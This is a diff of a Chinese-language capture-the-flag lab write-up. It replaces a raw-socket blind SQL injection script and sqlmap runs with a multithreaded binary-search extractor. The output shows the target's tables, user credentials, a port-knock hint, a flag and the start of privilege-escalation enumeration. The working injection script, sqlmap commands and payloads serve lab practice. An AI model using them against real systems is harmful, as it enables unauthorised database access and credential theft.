@@ -213,408 +213,172 @@ Target: http://10.216.75.72/
 * extractvalue
 过滤了这些关键字，而且应该是正则匹配，大小写，双写这些都绕过不了。根据过滤的关键字看，应该就是打布尔盲注了
 
+直接上脚本：
 ```python
-import socket  
 import urllib.parse  
+import requests  
+import concurrent.futures  
+import threading  
 import time  
   
 # ======================  
-# 发送 HTTP 请求  
+# 全局配置  
 # ======================  
-def raw_post(host, port, path, data, referer):  
-    body = data  
-    req = (f"POST {path} HTTP/1.1\r\n"  
-           f"Host: {host}:{port}\r\n"  
-           f"User-Agent: Mozilla/5.0\r\n"  
-           f"Referer: {referer}\r\n"  
-           f"Content-Type: application/x-www-form-urlencoded\r\n"  
-           f"Content-Length: {len(body)}\r\n"  
-           f"Connection: close\r\n\r\n{body}")  
+HOST = "10.216.75.72"  
+PORT = 80  
+URL = f"http://{HOST}:{PORT}/sl.php"  
+REFERER = f"http://{HOST}/secret.php"  
+PARAM = "query_id"  
   
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
-        s.connect((host, port))  
-        s.sendall(req.encode())  
+session = requests.Session()  
+session.headers.update({  
+    "User-Agent": "Mozilla/5.0",  
+    "Referer": REFERER,  
+    "Content-Type": "application/x-www-form-urlencoded"  
+})  
   
-        resp = b''  
-        while True:  
-            part = s.recv(4096)  
-            if not part:  
-                break  
-            resp += part  
+print_lock = threading.Lock()  
   
-    return resp.decode(errors='ignore')  
+# 用于控制只打印一次 Debug 信息  
+first_request_done = False  
+debug_lock = threading.Lock()  
   
   
 # ======================  
-# 布尔判断（带投票）  
+# 布尔判断（带 Debug 和 重试机制）  
 # ======================  
-def bool_check(host, port, path, param, referer, condition, retry=3):  
+def bool_check(condition, retry=3):  
+    global first_request_done  
+  
+    # 注释符 -- 后面必须带一个空格，所以 payload 尾部保留空格  
     payload = f"1' and ({condition}) -- "  
-    encoded = urllib.parse.quote(payload)  
-    data = f"{param}={encoded}"  
   
-    true_count = 0  
+    # 【关键修复】手动使用 quote 进行编码，保证空格是 %20 而不是 +    # 然后以字符串形式传给 requests，防止 requests 自动转换  
+    encoded_payload = urllib.parse.quote(payload)  
+    data_str = f"{PARAM}={encoded_payload}"  
   
-    for _ in range(retry):  
-        resp = raw_post(host, port, path, data, referer)  
+    for attempt in range(retry):  
+        try:  
+            # 发送请求  
+            resp = session.post(URL, data=data_str, timeout=5)  
   
-        if 'class="console success"' in resp:  
-            true_count += 1  
+            # 【测试要求】打印第一次发包的完整信息  
+            with debug_lock:  
+                if not first_request_done:  
+                    print("=" * 50 + "\n")  
+                    first_request_done = True  
   
-        time.sleep(0.03)  
+            return 'class="console success"' in resp.text  
   
-    return true_count > retry // 2  
+        except requests.RequestException as e:  
+            # 遇到网络错误时，等待一小会再重试  
+            time.sleep(0.5)  
+            if attempt == retry - 1:  
+                # print(f"\n[!] 网络请求失败: {e}")  
+                return False  
   
   
 # ======================  
-# 前缀盲注（核心）  
+# 二分查找获取单个字符  
 # ======================  
-def extract_prefix(host, port, path, param, referer, sql_expr, max_len=50):  
-    result = ""  
+def get_char_at_pos(sql_expr, pos):  
+    low = 32  
+    high = 126  
   
-    for pos in range(1, max_len + 1):  
-        found = False  
+    while low < high:  
+        mid = (low + high) // 2  
+        condition = f"ascii(substr(({sql_expr}),{pos},1))>{mid}"  
   
-        for ascii_val in range(32, 127):  # 直接 ASCII 枚举  
-            condition = f"ascii(substr(({sql_expr}),{pos},1))={ascii_val}"  
+        if bool_check(condition):  
+            low = mid + 1  
+        else:  
+            high = mid  
   
-            if bool_check(host, port, path, param, referer, condition):  
-                result += chr(ascii_val)  
-                print(result)  # ⭐ 每次输出完整前缀  
-                found = True  
-                break  
-        if not found:  
-            print("[!] 结束")  
-            break  
+    # 存在性检查：防止越界  
+    if low == 32:  
+        check_exist = f"ascii(substr(({sql_expr}),{pos},1))=32"  
+        if not bool_check(check_exist):  
+            return pos, None  
   
-    return result  
+    return pos, chr(low)  
+  
+  
+# ======================  
+# 多线程并发提取前缀  
+# ======================  
+def extract_fast(sql_expr, max_len=20, max_workers=5):  
+    result_dict = {}  
+  
+    # 降低默认线程数到 5，防止服务器崩掉  
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:  
+        futures = {executor.submit(get_char_at_pos, sql_expr, pos): pos for pos in range(1, max_len + 1)}  
+  
+        for future in concurrent.futures.as_completed(futures):  
+            pos = futures[future]  
+            try:  
+                _, char = future.result()  
+                if char is None:  
+                    continue  
+  
+                result_dict[pos] = char  
+  
+                with print_lock:  
+                    current_str = "".join([result_dict.get(i, "?") for i in range(1, max(result_dict.keys()) + 1)])  
+                    print(f"\r[+] 正在提取: {current_str}", end="", flush=True)  
+  
+            except Exception as e:  
+                pass  
+  
+    print()  
+    final_str = "".join(  
+        [result_dict.get(i, "") for i in range(1, max(result_dict.keys(), default=0) + 1) if result_dict.get(i)])  
+    return final_str  
   
   
 # ======================  
 # 主函数  
 # ======================  
 def main():  
-    HOST = "10.216.75.72"  
-    PORT = 80  
-    PATH = "/sl.php"  
-    REFERER = "http://10.216.75.72/secret.php"  
-    PARAM = "query_id"  
+    print("[*] 测试布尔连通性...")  
+    if bool_check("1=1") and not bool_check("1=2"):  
+        print("[+] 连通性测试通过！布尔逻辑正常。")  
+    else:  
+        print("[-] 连通性测试失败，请检查 WAF、网络或 Debug 输出。")  
+        return  
   
-    # 测试  
-    print("[*] 测试布尔")  
-    print("1=1 ->", bool_check(HOST, PORT, PATH, PARAM, REFERER, "1=1"))  
-    print("1=2 ->", bool_check(HOST, PORT, PATH, PARAM, REFERER, "1=2"))  
+    print("\n[*] 数据库名提取过程 (二分查找 + 多线程)：")  
   
-    # 数据库名  
-    print("\n[*] 数据库名提取过程：")  
-    db = extract_prefix(  
-        HOST, PORT, PATH, PARAM, REFERER,  
-        "select database()"  
-    )  
+    # 注意这里，如果查表要记得限制行数，比如 limit 0,1    # 先跑 select database() 试一试  
+    db = extract_fast("select database()", max_len=20, max_workers=5)  
+    tables = extract_fast("select group_concat(table_name) from information_schema.tables where table_schema=database()", max_len=50, max_workers=5)  
+    columns = extract_fast("select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'",max_len=50, max_workers=5)  
+    data = f'id={extract_fast("select id from users", max_len=20, max_workers=5)}\nusername={extract_fast("select username from users", max_len=20, max_workers=5)}\npassword={extract_fast("select password from users", max_len=20, max_workers=5)}'  
+    knock = extract_fast("select knock from users", max_len=100, max_workers=5)  
   
-    print(f"\n[+] 最终数据库名: {db}")  
+    
   
   
 if __name__ == "__main__":  
     main()
 ```
 
-```bash
-C:\Users\15819\PyCharmMiscProject\.venv\Scripts\python.exe C:\Users\15819\PyCharmMiscProject\靶机.py 
-[*] 测试布尔
-1=1 -> True
-1=2 -> False
+```ps
+C:\Users\15819\PyCharmMiscProject\.venv\Scripts\python.exe C:\Users\15819\PyCharmMiscProject\靶机2.py 
+[*] 测试布尔连通性...
+==================================================
 
-[*] 数据库名提取过程：
-f
-fo
-for
-fore
-fores
-forest
-forest_
-forest_t
-forest_te
-forest_tem
-forest_temp
-forest_templ
-forest_temple
-[!] 结束
+[+] 连通性测试通过！布尔逻辑正常。
 
-[+] 最终数据库名: forest_temple
-
-
-```
-布尔盲注打通了，现在要来想想怎么继续
-这边决定不手打了，直接上sqlmap
-```bash
-┌──(kali㉿kali)-[~/tmp/what]
-└─$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
---technique=B \
---level=3 --risk=2 \
---batch
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.9.2#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 03:48:58 /2026-05-06/
-
-custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
-[03:48:59] [INFO] testing connection to the target URL
-[03:48:59] [INFO] testing if the target URL content is stable
-[03:48:59] [INFO] target URL content is stable
-[03:48:59] [INFO] testing if (custom) POST parameter '#1*' is dynamic
-[03:48:59] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
-[03:48:59] [INFO] heuristic (basic) test shows that (custom) POST parameter '#1*' might be injectable
-[03:48:59] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
-[03:48:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[03:48:59] [WARNING] reflective value(s) found and filtering out
-[03:48:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
-[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
-[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[03:49:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
-[03:49:00] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
-[03:49:00] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
-[03:49:00] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive
-(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
----
-Parameter: #1* ((custom) POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
----
-[03:49:00] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian
-web application technology: Apache 2.4.62
-back-end DBMS: MySQL (MariaDB fork)
-[03:49:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
-[03:49:00] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 03:49:00 /2026-05-06/
-```
-继续下一步总是跑不出来
-```bash
-──(kali㉿kali)-[~/tmp/what]
-└─$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
---technique=B \
---dbs \
---skip-waf \
---threads=5 \
---batch
-```
-最后
-```bash
-┌──(kali㉿kali)-[~/tmp/what]
-└─$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
---technique=B \
---no-cast \
---common-tables \
---batch
-```
-成功了
-```bash
-┌──(kali㉿kali)-[~/tmp/what]
-└─$ what  --md --raw
-
-──────────────────────────────────────────────────
-$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
---technique=B \
---no-cast \
---common-tables \
---batch  (exit: 0)
-──────────────────────────────────────────────────
-
-该命令使用 sqlmap 对目标 URL http://10.216.75.72/sl.php 进行 SQL 注入测试，采用 POST 方法，参数 query_id=1*
-标记注入点，仅使用布尔盲注技术（--technique=B），并利用常见表名枚举（--common-tables）发现数据库中的表。
-
-执行结果：
-
- • 成功检测到布尔盲注注入点（基于 MySQL RLIKE）。
- • 获取目标信息：后端 DBMS 为 MySQL（MariaDB 分支），操作系统 Linux Debian，Web 应用 Apache 2.4.62。
- • 通过枚举 common-tables.txt 词表（含 3625 个常用表名），单线程运行，最终发现 10 个表：
-    • div_experiment
-    • experiencia
-    • experiment
-    • experimental_data_set
-    • expression
-    • hostbenchmarks
-    • jos_vm_export
-    • maxcodexperiencia
-    • routerbenchmarks
-    • users
- • 结果已保存至本地目录 /home/kali/.local/share/sqlmap/output/10.216.75.72。
-```
-原因是我也不知道，问的ai，过后再复盘一下。
-```bash
-┌──(kali㉿kali)-[~/tmp/what]
-└─$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
--D forest_temple -T users \
---columns \
---no-cast \
---text-only \
---technique=B \
---threads=3 \
---batch
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.9.2#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 04:16:40 /2026-05-06/
-
-custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
-[04:16:40] [INFO] resuming back-end DBMS 'mysql'
-[04:16:40] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: #1* ((custom) POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
----
-[04:16:40] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian
-web application technology: Apache 2.4.62
-back-end DBMS: MySQL unknown (MariaDB fork)
-[04:16:40] [INFO] fetching columns for table 'users' in database 'forest_temple'
-[04:16:40] [INFO] retrieved:
-[04:16:40] [WARNING] reflective value(s) found and filtering out
-4
-[04:16:40] [INFO] retrieving the length of query output
-[04:16:40] [INFO] retrieved: 2
-[04:16:40] [INFO] retrieved: id
-[04:16:40] [INFO] retrieving the length of query output
-[04:16:40] [INFO] retrieved: 7
-[04:16:40] [INFO] retrieved: int(11)
-[04:16:40] [INFO] retrieving the length of query output
-[04:16:40] [INFO] retrieved: 8
-[04:16:40] [INFO] retrieved: username
-[04:16:41] [INFO] retrieving the length of query output
-[04:16:40] [INFO] retrieved: 11
-[04:16:41] [INFO] retrieved: varchar(50)
-[04:16:41] [INFO] retrieving the length of query output
-[04:16:41] [INFO] retrieved: 8
-[04:16:41] [INFO] retrieved: password
-[04:16:41] [INFO] retrieving the length of query output
-[04:16:41] [INFO] retrieved: 12
-[04:16:41] [INFO] retrieved: varchar(255)
-[04:16:42] [INFO] retrieving the length of query output
-[04:16:41] [INFO] retrieved: 5
-[04:16:42] [INFO] retrieved: knock
-[04:16:42] [INFO] retrieving the length of query output
-[04:16:42] [INFO] retrieved: 12
-[04:16:42] [INFO] retrieved: varchar(255)
-Database: forest_temple
-Table: users
-[4 columns]
-+----------+--------------+
-| Column   | Type         |
-+----------+--------------+
-| id       | int(11)      |
-| knock    | varchar(255) |
-| password | varchar(255) |
-| username | varchar(50)  |
-+----------+--------------+
-
-[04:16:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
-[04:16:42] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 04:16:42 /2026-05-06/
+[*] 数据库名提取过程 (二分查找 + 多线程)：
+[+] 正在提取: forest_temple
+[+] 正在提取: tablets,users
+[+] 正在提取: id,username,password,knock
+[+] 正在提取: 1
+[+] 正在提取: bingren
+[+] 正在提取: youareuser
+[+] 正在提取: I have three loves: 7777, 8888, 9999
 ```
 
-```bash
-┌──(kali㉿kali)-[~/tmp/what]
-└─$ sqlmap -u "http://10.216.75.72/sl.php" \
---method=POST \
---data="query_id=1*" \
---referer="http://10.216.75.72/secret.php" \
--D forest_temple -T users \
---dump \
---technique=B \
---no-cast \
---text-only \
---batch
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.9.2#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 04:17:22 /2026-05-06/
-
-custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
-[04:17:22] [INFO] resuming back-end DBMS 'mysql'
-[04:17:22] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: #1* ((custom) POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: query_id=1' RLIKE (SELECT (CASE WHEN (4486=4486) THEN 1 ELSE 0x28 END))-- ccIA
----
-[04:17:22] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian
-web application technology: Apache 2.4.62
-back-end DBMS: MySQL unknown (MariaDB fork)
-[04:17:22] [INFO] fetching columns for table 'users' in database 'forest_temple'
-[04:17:22] [INFO] resumed: 4
-[04:17:22] [INFO] resumed: id
-[04:17:22] [INFO] resumed: username
-[04:17:22] [INFO] resumed: password
-[04:17:22] [INFO] resumed: knock
-[04:17:22] [INFO] fetching entries for table 'users' in database 'forest_temple'
-[04:17:22] [INFO] fetching number of entries for table 'users' in database 'forest_temple'
-[04:17:22] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[04:17:22] [INFO] retrieved:
-[04:17:22] [WARNING] reflective value(s) found and filtering out
-1
-[04:17:22] [INFO] retrieved: 1
-[04:17:22] [INFO] retrieved: I have three loves: 7777, 8888, 9999
-[04:17:24] [INFO] retrieved: youareuser
-[04:17:24] [INFO] retrieved: bingren
-Database: forest_temple
-Table: users
-[1 entry]
-+----+--------------------------------------+------------+----------+
-| id | knock                                | password   | username |
-+----+--------------------------------------+------------+----------+
-| 1  | I have three loves: 7777, 8888, 9999 | youareuser | bingren  |
-+----+--------------------------------------+------------+----------+
-
-[04:17:24] [INFO] table 'forest_temple.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.216.75.72/dump/forest_temple/users.csv'
-[04:17:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.216.75.72'
-[04:17:24] [WARNING] your sqlmap version is outdated
-```
 成功登录
 ```bash
 ┌──(kali㉿kali)-[~/tmp/what]
@@ -634,3 +398,14 @@ flag{user-7e83921312384950a218f293a120c942}
 ```
 `flag{user-7e83921312384950a218f293a120c942}`
 
+# 提权
+## 信息收集一下
+```bash
+bingren@Open:~$ sudo -l
+Matching Defaults entries for bingren on Open:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bingren may run the following commands on Open:
+    (ALL) NOPASSWD: /usr/bin/uptime
+
+```
